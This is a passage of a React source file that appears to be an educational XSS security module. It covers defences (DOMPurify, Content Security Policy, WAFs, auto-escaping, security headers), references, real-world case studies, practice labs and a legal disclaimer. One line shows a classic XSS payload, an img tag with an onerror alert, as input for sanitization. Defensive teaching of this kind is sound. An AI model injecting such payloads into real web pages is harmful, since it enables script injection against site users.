          <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
            <Lock className="w-6 h-6 text-green-600 dark:text-green-400" />
            DOMPurify (Sanitization Library)
          </h3>
          <p className="text-gray-700 dark:text-gray-300 mb-4">
            Industry-standard JavaScript library for sanitizing HTML and preventing XSS attacks.
            Works in all modern browsers and Node.js.
          </p>
          <div className="bg-gray-900 dark:bg-black rounded p-4 font-mono text-sm mb-4">
            <code className="text-gray-600 dark:text-gray-400">
              import DOMPurify from 'dompurify';<br />
              <br />
              const dirty = '&lt;img src=x onerror=alert(1)&gt;';<br />
              const clean = DOMPurify.sanitize(dirty);<br />
              // Result: &lt;img src="x"&gt;
            </code>
          </div>
          <div className="space-y-2 text-sm">
            <p className="font-semibold text-emerald-600 dark:text-emerald-400">Key Features:</p>
            <ul className="list-disc list-inside space-y-1 text-gray-600 dark:text-gray-400">
              <li>Fast and lightweight (19KB minified)</li>
              <li>Configurable sanitization policies</li>
              <li>Works with HTML, SVG, and MathML</li>
              <li>Actively maintained and battle-tested</li>
              <li>No dependencies</li>
            </ul>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-blue-300 dark:border-blue-700 rounded-lg p-6">
          <h3 className="text-xl font-semibold mb-3 text-gray-900 dark:text-white">Content Security Policy (CSP)</h3>
          <p className="text-gray-700 dark:text-gray-300 mb-4">
            HTTP response header that helps prevent XSS by controlling which resources can be loaded.
          </p>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <p className="text-sm font-semibold mb-2 text-emerald-600 dark:text-emerald-400">CSP Benefits:</p>
              <ul className="list-disc list-inside space-y-1 text-sm text-gray-600 dark:text-gray-400">
                <li>Blocks inline scripts by default</li>
                <li>Whitelists trusted script sources</li>
                <li>Prevents eval() and similar functions</li>
                <li>Reports policy violations</li>
                <li>Defense-in-depth security layer</li>
              </ul>
            </div>
            <div className="bg-gray-900 dark:bg-black rounded p-3 font-mono text-xs">
              <code className="text-gray-600 dark:text-gray-400">
                Content-Security-Policy:<br />
                &nbsp;&nbsp;default-src 'self';<br />
                &nbsp;&nbsp;script-src 'self'<br />
                &nbsp;&nbsp;&nbsp;&nbsp;https://cdn.example.com;<br />
                &nbsp;&nbsp;object-src 'none';
              </code>
            </div>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-purple-300 dark:border-purple-700 rounded-lg p-6">
          <h3 className="text-xl font-semibold mb-3 text-gray-900 dark:text-white">Web Application Firewalls (WAF)</h3>
          <p className="text-gray-700 dark:text-gray-300 mb-4">
            Deploy WAFs to filter and block malicious XSS payloads before they reach the application.
          </p>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded p-3">
              <p className="font-semibold mb-1 text-gray-900 dark:text-white">ModSecurity</p>
              <p className="text-xs text-gray-600 dark:text-gray-400">Open-source WAF with OWASP Core Rule Set</p>
            </div>
            <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded p-3">
              <p className="font-semibold mb-1 text-gray-900 dark:text-white">Cloudflare WAF</p>
              <p className="text-xs text-gray-600 dark:text-gray-400">Cloud-based XSS protection with managed rules</p>
            </div>
            <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded p-3">
              <p className="font-semibold mb-1 text-gray-900 dark:text-white">AWS WAF</p>
              <p className="text-xs text-gray-600 dark:text-gray-400">Customizable XSS filtering rules</p>
            </div>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-emerald-300 dark:border-emerald-700 rounded-lg p-6">
          <h3 className="text-xl font-semibold mb-3 text-gray-900 dark:text-white">Secure Coding Frameworks</h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <p className="text-sm font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Auto-Escaping Templating:</p>
              <ul className="list-disc list-inside space-y-1 text-sm text-gray-600 dark:text-gray-400">
                <li>React (JSX auto-escaping)</li>
                <li>Vue.js (v-text directive)</li>
                <li>Angular (sanitization built-in)</li>
                <li>Jinja2 (Flask/Django)</li>
                <li>Handlebars (double brace syntax)</li>
              </ul>
            </div>
            <div>
              <p className="text-sm font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Security Headers:</p>
              <ul className="list-disc list-inside space-y-1 text-sm text-gray-600 dark:text-gray-400">
                <li>X-XSS-Protection: 1; mode=block</li>
                <li>X-Content-Type-Options: nosniff</li>
                <li>X-Frame-Options: DENY</li>
                <li>Referrer-Policy: no-referrer</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>
  </div>
);

const ReferencesTab = () => (
  <div className="space-y-8">
    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">Official Documentation & Guidelines</h2>
      <div className="space-y-4">
        <a
          href="https://owasp.org/www-community/attacks/xss/"
          target="_blank"
          rel="noopener noreferrer"
          className="block bg-white dark:bg-gray-800 border-2 border-emerald-300 dark:border-emerald-700 rounded-lg p-5 hover:border-cyan-400 transition-all"
        >
          <h3 className="text-xl font-semibold mb-2 flex items-center gap-2">
            <BookOpen className="w-5 h-5 text-blue-600 dark:text-blue-400" />
            OWASP XSS Prevention Cheat Sheet
          </h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-2">
            Comprehensive guide on preventing XSS attacks with context-specific encoding techniques,
            secure coding practices, and framework recommendations.
          </p>
          <p className="text-xs text-emerald-600 dark:text-emerald-400">https://owasp.org/www-community/attacks/xss/</p>
        </a>

        <a
          href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
          target="_blank"
          rel="noopener noreferrer"
          className="block bg-white dark:bg-gray-800 border-2 border-purple-300 dark:border-purple-700 rounded-lg p-5 hover:border-pink-400 transition-all"
        >
          <h3 className="text-xl font-semibold mb-2 flex items-center gap-2">
            <Shield className="w-5 h-5 text-purple-400" />
            OWASP XSS Prevention Cheat Sheet
          </h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-2">
            Detailed prevention strategies for different contexts: HTML, attributes, JavaScript,
            CSS, and URLs. Essential reading for developers.
          </p>
          <p className="text-xs text-purple-400">https://cheatsheetseries.owasp.org/...</p>
        </a>

        <a
          href="https://portswigger.net/web-security/cross-site-scripting"
          target="_blank"
          rel="noopener noreferrer"
          className="block bg-white dark:bg-gray-800 border-2 border-green-300 dark:border-green-700 rounded-lg p-5 hover:border-green-400 transition-all"
        >
          <h3 className="text-xl font-semibold mb-2 flex items-center gap-2">
            <Globe className="w-5 h-5 text-green-600 dark:text-green-400" />
            PortSwigger Web Security Academy - XSS
          </h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-2">
            Interactive learning platform with hands-on XSS labs, video tutorials, and real-world
            exploitation techniques. Includes free practice environments.
          </p>
          <p className="text-xs text-green-600 dark:text-green-400">https://portswigger.net/web-security/cross-site-scripting</p>
        </a>

        <a
          href="https://content-security-policy.com/"
          target="_blank"
          rel="noopener noreferrer"
          className="block bg-white dark:bg-gray-800 border-2 border-orange-300 dark:border-orange-700 rounded-lg p-5 hover:border-orange-400 transition-all"
        >
          <h3 className="text-xl font-semibold mb-2 flex items-center gap-2">
            <Lock className="w-5 h-5 text-orange-400" />
            Content Security Policy Reference
          </h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-2">
            Complete CSP reference with directive explanations, browser compatibility, and
            implementation examples. Essential for XSS mitigation.
          </p>
          <p className="text-xs text-orange-400">https://content-security-policy.com/</p>
        </a>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">Real-World Case Studies</h2>
      <div className="space-y-4">
        <div className="bg-white dark:bg-gray-800 border-2 border-red-300 dark:border-red-700 rounded-lg p-5">
          <h3 className="text-xl font-semibold mb-2 flex items-center gap-2">
            <AlertTriangle className="w-5 h-5 text-red-400" />
            Samy Worm - MySpace (2005)
          </h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-3">
            First major XSS worm that infected over 1 million MySpace users in 20 hours, demonstrating
            the viral potential of stored XSS attacks on social platforms.
          </p>
          <div className="bg-black/30 rounded p-4 mb-3">
            <p className="text-xs font-semibold mb-2 text-emerald-600 dark:text-emerald-400">Key Lessons:</p>
            <ul className="list-disc list-inside space-y-1 text-xs text-gray-600 dark:text-gray-400">
              <li>Stored XSS can self-propagate across user-generated content</li>
              <li>Filter bypass techniques using JavaScript encoding</li>
              <li>Impact: Site shutdown, legal consequences for creator</li>
              <li>Defense: Multi-layered input validation and CSP headers</li>
            </ul>
          </div>
          <div className="flex gap-2">
            <span className="px-3 py-1 bg-red-500/30 rounded text-xs">1M+ Users</span>
            <span className="px-3 py-1 bg-orange-500/30 rounded text-xs">20 Hours</span>
            <span className="px-3 py-1 bg-yellow-500/30 rounded text-xs">2005</span>
          </div>
        </div>

        <div className="bg-gradient-to-br from-orange-500/20 to-yellow-500/20 border border-orange-500/50 rounded-lg p-5">
          <h3 className="text-xl font-semibold mb-2 text-gray-900 dark:text-white">Twitter XSS Worm (2010)</h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-3">
            Onmouseover XSS vulnerability allowed self-propagating worm to spread via tweets,
            affecting thousands of users including high-profile accounts.
          </p>
          <div className="flex gap-2">
            <span className="px-3 py-1 bg-orange-500/30 rounded text-xs">Thousands Affected</span>
            <span className="px-3 py-1 bg-yellow-500/30 rounded text-xs">2010</span>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-yellow-300 dark:border-yellow-700 rounded-lg p-5">
          <h3 className="text-xl font-semibold mb-2 text-gray-900 dark:text-white">British Airways XSS (2018)</h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-3">
            XSS attack on British Airways website led to payment card data theft from 380,000
            transactions, resulting in 183 million pound fine.
          </p>
          <div className="flex gap-2">
            <span className="px-3 py-1 bg-yellow-500/30 rounded text-xs">380K Compromised</span>
            <span className="px-3 py-1 bg-orange-500/30 rounded text-xs">183M Fine</span>
            <span className="px-3 py-1 bg-red-500/30 rounded text-xs">2018</span>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-purple-300 dark:border-purple-700 rounded-lg p-5">
          <h3 className="text-xl font-semibold mb-2 text-gray-900 dark:text-white">eBay Persistent XSS (2015-2016)</h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-3">
            Researchers discovered multiple stored XSS vulnerabilities in eBay's listing pages that
            persisted for months, potentially affecting millions of users.
          </p>
          <div className="flex gap-2">
            <span className="px-3 py-1 bg-purple-500/30 rounded text-xs">Multiple Vectors</span>
            <span className="px-3 py-1 bg-pink-500/30 rounded text-xs">2015-2016</span>
          </div>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">Tools & Resources</h2>
      <div className="space-y-3">
        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
          <div className="flex items-center justify-between">
            <div>
              <p className="font-semibold text-gray-900 dark:text-white">XSS Filter Evasion Cheat Sheet</p>
              <p className="text-sm text-gray-500 dark:text-gray-500">Comprehensive collection of XSS vectors and bypass techniques</p>
            </div>
            <a
              href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet"
              target="_blank"
              rel="noopener noreferrer"
              className="px-4 py-2 bg-emerald-100 dark:bg-emerald-900/20 hover:bg-emerald-200 dark:hover:bg-emerald-800/30 rounded text-sm transition-all"
            >
              Visit
            </a>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
          <div className="flex items-center justify-between">
            <div>
              <p className="font-semibold text-gray-900 dark:text-white">DOMPurify GitHub Repository</p>
              <p className="text-sm text-gray-500 dark:text-gray-500">Industry-standard XSS sanitization library</p>
            </div>
            <a
              href="https://github.com/cure53/DOMPurify"
              target="_blank"
              rel="noopener noreferrer"
              className="px-4 py-2 bg-emerald-100 dark:bg-emerald-900/20 hover:bg-emerald-200 dark:hover:bg-emerald-800/30 rounded text-sm transition-all"
            >
              GitHub
            </a>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
          <div className="flex items-center justify-between">
            <div>
              <p className="font-semibold text-gray-900 dark:text-white">PayloadsAllTheThings - XSS</p>
              <p className="text-sm text-gray-500 dark:text-gray-500">Extensive XSS payload collection and exploitation techniques</p>
            </div>
            <a
              href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
              target="_blank"
              rel="noopener noreferrer"
              className="px-4 py-2 bg-emerald-100 dark:bg-emerald-900/20 hover:bg-emerald-200 dark:hover:bg-emerald-800/30 rounded text-sm transition-all"
            >
              GitHub
            </a>
          </div>
        </div>

        <div className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg p-4">
          <div className="flex items-center justify-between">
            <div>
              <p className="font-semibold text-gray-900 dark:text-white">XSStrike Tool Documentation</p>
              <p className="text-sm text-gray-500 dark:text-gray-500">Advanced XSS detection and exploitation framework</p>
            </div>
            <a
              href="https://github.com/s0md3v/XSStrike"
              target="_blank"
              rel="noopener noreferrer"
              className="px-4 py-2 bg-emerald-100 dark:bg-emerald-900/20 hover:bg-emerald-200 dark:hover:bg-emerald-800/30 rounded text-sm transition-all"
            >
              GitHub
            </a>
          </div>
        </div>
      </div>
    </section>

    <section>
      <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">Practice Platforms</h2>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="bg-white dark:bg-gray-800 border-2 border-emerald-300 dark:border-emerald-700 rounded-lg p-5">
          <h3 className="text-lg font-semibold mb-2 text-gray-900 dark:text-white">PortSwigger Web Security Academy</h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-2">
            Free interactive XSS labs with varying difficulty levels and real-world scenarios.
          </p>
          <span className="text-xs text-emerald-600 dark:text-emerald-400">Free • Interactive • Hands-On</span>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-purple-300 dark:border-purple-700 rounded-lg p-5">
          <h3 className="text-lg font-semibold mb-2 text-gray-900 dark:text-white">HackTheBox</h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-2">
            Realistic vulnerable machines and web challenges including XSS exploitation.
          </p>
          <span className="text-xs text-purple-400">CTF Style • Community</span>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-green-300 dark:border-green-700 rounded-lg p-5">
          <h3 className="text-lg font-semibold mb-2 text-gray-900 dark:text-white">DVWA (Damn Vulnerable Web App)</h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-2">
            PHP/MySQL web application with multiple XSS challenges at different security levels.
          </p>
          <span className="text-xs text-green-600 dark:text-green-400">Open Source • Local Setup</span>
        </div>

        <div className="bg-white dark:bg-gray-800 border-2 border-orange-300 dark:border-orange-700 rounded-lg p-5">
          <h3 className="text-lg font-semibold mb-2 text-gray-900 dark:text-white">XSS Game by Google</h3>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-2">
            Progressive XSS challenges created by Google to teach secure coding practices.
          </p>
          <span className="text-xs text-orange-400">Educational • Progressive</span>
        </div>
      </div>
    </section>

    <section>
      <div className="bg-white dark:bg-gray-800 border-2 border-yellow-300 dark:border-yellow-700 rounded-lg p-6">
        <h3 className="text-xl font-semibold mb-3 flex items-center gap-2">
          <AlertTriangle className="w-6 h-6 text-yellow-400" />
          Legal and Ethical Disclaimer
        </h3>
        <div className="space-y-3 text-sm text-gray-700 dark:text-gray-300">
          <p>
            The information and tools provided in this module are for educational purposes only.
            Cross-Site Scripting attacks against systems you do not own or have permission to test
            are illegal in most jurisdictions.
          </p>
          <div className="bg-red-500/20 rounded p-3">
            <p className="font-semibold mb-2 text-red-300">Always Remember:</p>
            <ul className="list-disc list-inside space-y-1">
              <li>Only test systems you own or have explicit written authorization to test</li>
              <li>Unauthorized XSS attacks violate computer crime laws (CFAA, Computer Misuse Act)</li>
              <li>Ethical hackers must operate within legal boundaries and professional standards</li>
              <li>Bug bounty programs provide legal avenues for security research</li>
              <li>Document all testing activities and maintain proper authorization records</li>
            </ul>
          </div>
          <p className="text-xs text-gray-500 dark:text-gray-500">
            Violations can result in criminal prosecution, imprisonment, and substantial fines.
            Use this knowledge to build secure applications and defend against attacks.
          </p>
        </div>
      </div>
    </section>
  </div>
);
